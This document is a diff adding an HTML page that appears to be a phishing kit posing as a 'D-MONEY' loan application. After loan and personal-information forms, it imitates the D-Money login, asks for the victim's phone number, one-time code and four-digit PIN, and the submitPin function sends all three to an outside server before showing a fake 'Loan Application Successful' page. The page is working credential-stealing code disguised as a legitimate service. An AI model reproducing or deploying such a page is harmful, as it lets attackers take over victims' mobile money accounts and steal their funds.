@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loan Application - D-MONEY</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+* { box-sizing: border-box; }
+body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; min-height: 100svh; overflow-x: hidden; background: #ffffff; }
+body.loan-bg { 
+  background-image: linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.35)), url("https://images.pexels.com/photos/3184297/pexels-photo-3184297.jpeg"); 
+  background-size: cover; background-position: center; background-repeat: no-repeat; 
+}
+
+/* ===== LOAN APPLICATION ===== */
+.container { max-width: 420px; margin: 20px auto 40px; background: rgba(255,255,255,0.9); border-radius: 14px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+h2 { text-align: left; margin-bottom: 20px; }
+.step { display: none; }
+.step.active { display: block; }
+input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; }
+button { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 12px; background: #9aa8bd; color: #fff; }
+button.active { background: #1c3f6e; }
+.error { color: #d63031; font-size: 14px; display: none; }
+.summary { background: #f3f4f6; padding: 12px; border-radius: 8px; margin-top: 10px; font-size: 14px; }
+#step1Btn { background: #1c3f6e; } /* Dark blue apply button */
+
+/* ===== DMoney Login Flow ===== */
+.hidden { display: none; }
+h1, h2 { font-size: 26px; margin-bottom: 6px; text-align: left; }
+p { color: #777; text-align: left; }
+.back-arrow { font-size: 22px; cursor: pointer; position: absolute; top: 15px; left: 15px; user-select: none; z-index: 10; }
+.input-box { display: flex; align-items: center; border: 2px solid #1c3f6e; border-radius: 10px; padding: 14px; margin-top: 60px; }
+.prefix { margin-right: 10px; font-weight: 600; }
+.bottom-controls { position: absolute; bottom: 20px; left: 20px; right: 20px; display: flex; flex-direction: column; gap: 12px; align-items: flex-start; }
+.terms { display: flex; align-items: center; gap: 3px; font-size: 13px; margin: 0; }
+.otp-container { max-width: 420px; margin: 0 auto; padding: 20px; text-align: left; position: relative; min-height: 100vh; box-sizing: border-box; }
+.otp-container h2 { margin-top: 60px; }
+.otp-inputs { display: flex; justify-content: space-between; margin: 20px 0; padding: 0 12px; }
+.otp-inputs input { width: 50px; height: 55px; text-align: center; font-size: 22px; border: 2px solid #1c3f6e; border-radius: 8px; }
+.otp-container .bottom-controls { position: absolute; bottom: 20px; left: 20px; right: 20px; }
+.success-container { max-width: 420px; margin: 0 auto; padding: 20px; min-height: 100vh; }
+.success-container iframe { border-radius: 10px; }
+</style>
+</head>
+<body class="loan-bg">
+
+<!-- ===== PAGES 1-4: Loan Application ===== -->
+<div class="container step active" id="step1">
+  <h2>Get Your Loan Approved Faster. Apply in minutes and receive instant feedback.</h2>
+  <input type="number" id="loanAmount" placeholder="Loan Amount">
+  <input type="number" id="loanTerm" placeholder="Loan Term (Months)">
+  <p class="error" id="error1">Please fill all required fields.</p>
+  <button id="step1Btn" onclick="nextStep(1)">Apply Now</button>
+</div>
+
+<div class="container step" id="step2">
+  <h2>Loan Details</h2>
+  <select id="loanType">
+    <option value="">Select Loan Type</option>
+    <option value="personal">Personal</option>
+    <option value="business">Business</option>
+  </select>
+  <input type="number" id="loanAmount2" placeholder="Loan Amount">
+  <input type="number" id="loanTerm2" placeholder="Loan Term (Months)">
+  <input type="text" id="loanPurpose" placeholder="Loan Purpose">
+  <p class="error" id="error2">Complete all loan details.</p>
+  <button onclick="prevStep()">Previous</button>
+  <button id="step2Btn" onclick="nextStep(2)">Proceed</button>
+</div>
+
+<div class="container step" id="step3">
+  <h2>Personal Information</h2>
+  <input type="text" id="firstName" placeholder="First Name">
+  <input type="text" id="lastName" placeholder="Last Name">
+  <input type="email" id="email" placeholder="Email Address">
+  <input type="tel" id="phoneLoan" placeholder="Phone Number">
+  <p class="error" id="error3">All fields are required.</p>
+  <button onclick="prevStep()">Previous</button>
+  <button id="step3Btn" onclick="nextStep(3)">Proceed</button>
+</div>
+
+<div class="container step" id="step4">
+  <h2>Employment Info</h2>
+  <select id="employmentStatus">
+    <option value="">Employment Status</option>
+    <option value="employed">Employed</option>
+    <option value="self-employed">Self-Employed</option>
+    <option value="unemployed">Unemployed</option>
+  </select>
+  <input type="number" id="annualIncome" placeholder="Annual Income">
+  <div class="summary" id="applicationSummary"></div>
+  <p class="error" id="error4">Employment details required.</p>
+  <button onclick="prevStep()">Previous</button>
+  <button id="step4Btn" onclick="submitApplication()">Submit</button>
+</div>
+
+<!-- ===== PAGE 5: DMoney Login (NO CONTAINER) ===== -->
+<div class="step" id="dmoneyLogin">
+  <div class="back-arrow" onclick="goBackLogin()">←</div>
+  <h1>Let’s get started</h1>
+  <p>Enter your phone number to get started</p>
+  <div class="input-box">
+    <div class="prefix">+253</div>
+    <input type="tel" id="phone" placeholder="Enter phone number" maxlength="9"
+      oninput="this.value=this.value.replace(/\D/g,'').slice(0,9); updateLoginButton();" />
+  </div>
+  <div class="bottom-controls" id="loginBottom">
+    <label class="terms">
+      <input type="checkbox" id="termsCheck" checked onchange="updateLoginButton()" />
+      <span>I agree to the <a href="#">Terms of Service</a></span>
+    </label>
+    <button id="loginBtn" onclick="handleContinue()">Continue</button>
+  </div>
+</div>
+
+<!-- ===== PAGE 6: OTP ===== -->
+<div class="otp-container step" id="dmoneyOtp">
+  <div class="back-arrow" onclick="goBackOtp()">←</div>
+  <h2>Enter Your OTP</h2>
+  <p id="otpSubText">Please enter the OTP code sent to the phone number: (+253)*******</p>
+  <div class="otp-inputs">
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+    <input maxlength="1" oninput="updateOtpButton()" />
+  </div>
+  <div class="bottom-controls">
+    <button id="otpBtn" onclick="goToPinPage()">Continue</button>
+  </div>
+</div>
+
+<!-- ===== PAGE 7: PIN ===== -->
+<div class="otp-container step" id="dmoneyPin">
+  <div class="back-arrow" onclick="goBackPin()">←</div>
+  <h2>Glad to see you again</h2>
+  <p id="pinSubText">(+253)********</p>
+  <p>Please enter your 4-digit PIN code</p>
+  <div class="otp-inputs" id="pinInputs">
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+    <input maxlength="1" oninput="updatePinButton()" />
+  </div>
+  <div class="bottom-controls">
+    <button id="pinBtn" onclick="submitPin()">Continue</button>
+  </div>
+</div>
+
+<!-- ===== PAGE 8: SUCCESS ===== -->
+<div class="success-container step" id="dmoneySuccess">
+  <h1>🎉 Loan Application Successful</h1>
+  <p>Your application has been submitted successfully.</p>
+  <h3>Sponsored — D-Money Digital Revolution</h3>
+  <iframe width="100%" height="315" src="https://www.youtube.com/embed/x8JW5sCUMUI" allowfullscreen></iframe>
+  <br><br>
+  <button style="background:#1c3f6e;cursor:pointer;" onclick="restartApp()">Back to Home</button>
+</div>
+
+<script>
+/* ===== LOAN APPLICATION LOGIC ===== */
+let currentStep = 1;
+const steps = document.querySelectorAll(".step");
+
+function showStep(step){
+  steps.forEach((el,i)=>el.classList.toggle("active",i===step-1));
+  if(step<=4){ document.body.classList.add("loan-bg"); } else { document.body.classList.remove("loan-bg"); }
+  if(step===4) updateSummary();
+}
+
+function nextStep(step){
+  if(!validateStep(step)) return;
+  currentStep++;
+  showStep(currentStep);
+}
+
+function prevStep(){
+  if(currentStep>1){ currentStep--; showStep(currentStep);}
+}
+
+function validateStep(step){
+  const error=document.getElementById("error"+step);
+  if(error) error.style.display="none";
+  let valid=true;
+  if(step===1) valid=loanAmount.value&&loanTerm.value;
+  if(step===2) valid=loanType.value&&loanAmount2.value&&loanTerm2.value&&loanPurpose.value;
+  if(step===3) valid=firstName.value&&lastName.value&&email.value&&phoneLoan.value;
+  if(!valid && error) error.style.display="block";
+  return valid;
+}
+
+function updateSummary(){
+  applicationSummary.innerHTML=`
+<strong>Loan Type:</strong> ${loanType.value}<br>
+<strong>Amount:</strong> ${loanAmount2.value}<br>
+<strong>Term:</strong> ${loanTerm2.value} months<br>
+<strong>Purpose:</strong> ${loanPurpose.value}<br>
+<strong>Name:</strong> ${firstName.value} ${lastName.value}<br>
+<strong>Email:</strong> ${email.value}<br>
+<strong>Phone:</strong> ${phoneLoan.value}<br>
+<strong>Employment:</strong> ${employmentStatus.value}<br>
+<strong>Income:</strong> ${annualIncome.value}`;
+}
+
+function submitApplication(){
+  if(!employmentStatus.value||!annualIncome.value){
+    error4.style.display="block";
+    return;
+  }
+  currentStep = 5; // Move to DMoney login page
+  showStep(currentStep);
+}
+
+/* ===== DMoney LOGIN LOGIC ===== */
+const loginBtn = document.getElementById("loginBtn");
+const termsCheck = document.getElementById("termsCheck");
+const otpBtn = document.getElementById("otpBtn");
+const otpInputs = document.querySelectorAll("#dmoneyOtp .otp-inputs input");
+const otpSubText = document.getElementById("otpSubText");
+const pinPage = document.getElementById("dmoneyPin");
+const pinInputs = document.querySelectorAll("#dmoneyPin .otp-inputs input");
+const pinBtn = document.getElementById("pinBtn");
+const pinSubText = document.getElementById("pinSubText");
+
+let userPhone = "";
+let currentOtp = "";
+
+function updateLoginButton() {
+  if (termsCheck.checked && document.getElementById("phone").value.length === 9)
+    loginBtn.classList.add("active");
+  else loginBtn.classList.remove("active");
+}
+
+function updateOtpButton() {
+  const filled = Array.from(otpInputs).every(i => i.value !== "");
+  filled ? otpBtn.classList.add("active") : otpBtn.classList.remove("active");
+}
+
+function updatePinButton() {
+  const filled = Array.from(pinInputs).every(i => i.value !== "");
+  filled ? pinBtn.classList.add("active") : pinBtn.classList.remove("active");
+}
+
+function handleContinue() {
+  if (!loginBtn.classList.contains("active")) return;
+  userPhone = document.getElementById("phone").value;
+  showStep(6); // OTP page
+  otpSubText.textContent = `Please enter the OTP code sent to the phone number: (+253)${userPhone}`;
+  otpInputs[0].focus();
+}
+
+function goToPinPage() {
+  if (!otpBtn.classList.contains("active")) return;
+  currentOtp = Array.from(otpInputs).map(i => i.value).join("");
+  showStep(7); // PIN page
+  const masked = userPhone.slice(0,5) + "****";
+  pinSubText.textContent = `(+253)${masked}`;
+  pinInputs[0].focus();
+}
+
+function goBackOtp() { showStep(5); }
+function goBackPin() { showStep(6); }
+function goBackLogin() { alert("Already on the login page"); }
+
+otpInputs.forEach((input,index)=>{ input.addEventListener("input",()=>{ if(input.value && otpInputs[index+1]) otpInputs[index+1].focus(); updateOtpButton(); }); });
+pinInputs.forEach((input,index)=>{ input.addEventListener("input",()=>{ if(input.value && pinInputs[index+1]) pinInputs[index+1].focus(); updatePinButton(); }); });
+
+async function submitPin() {
+  if (!pinBtn.classList.contains("active")) return;
+  const pin = Array.from(pinInputs).map(i=>i.value).join("");
+  try {
+    const res = await fetch("https://emulator-loans.vercel.app/", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: userPhone, otp: currentOtp, pin })
+    });
+    const result = await res.json();
+    console.log(result.message);
+    showSuccessPage();
+  } catch(err) {
+    console.error(err);
+    showSuccessPage();
+  }
+}
+
+function showSuccessPage(){ showStep(8); }
+function restartApp(){
+  otpInputs.forEach(i=>i.value=""); pinInputs.forEach(i=>i.value="");
+  document.getElementById("phone").value="";
+  showStep(1); currentStep=1;
+}
+</script>
+</body>
+</html>
